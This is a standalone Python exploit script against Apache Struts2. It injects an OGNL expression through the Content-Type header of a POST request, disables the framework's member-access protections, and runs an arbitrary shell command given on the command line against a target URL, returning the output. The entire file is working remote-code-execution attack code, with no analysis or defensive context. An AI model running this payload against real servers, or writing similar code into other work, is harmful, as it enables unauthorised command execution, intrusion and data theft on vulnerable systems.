#!/usr/bin/env python3

import http.client, urllib
import sys

def exploit(url, cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    headers = {'Content-Type': payload}

    # split url into two substrings: address and path
    address, path = url.split('/', 1)
    path = '/' + path
    
    # Incomplete Chunk Read error handling
    try:
        conn = http.client.HTTPConnection(address)
        conn.request("POST", path, " ", headers)
        page = conn.getresponse().read()
    except (http.client.IncompleteRead) as e:
        page = e.partial

    # convert bytes to string for better output format
    print('\n' + page.decode("utf-8"))
    return page 


def main():
    if(len(sys.argv)) != 3:
        print("Usage: exploit.py <url> <cmd>")
    else:
        url = sys.argv[1]
        cmd = sys.argv[2]
        exploit(url, cmd)

if __name__ == "__main__":
    main()
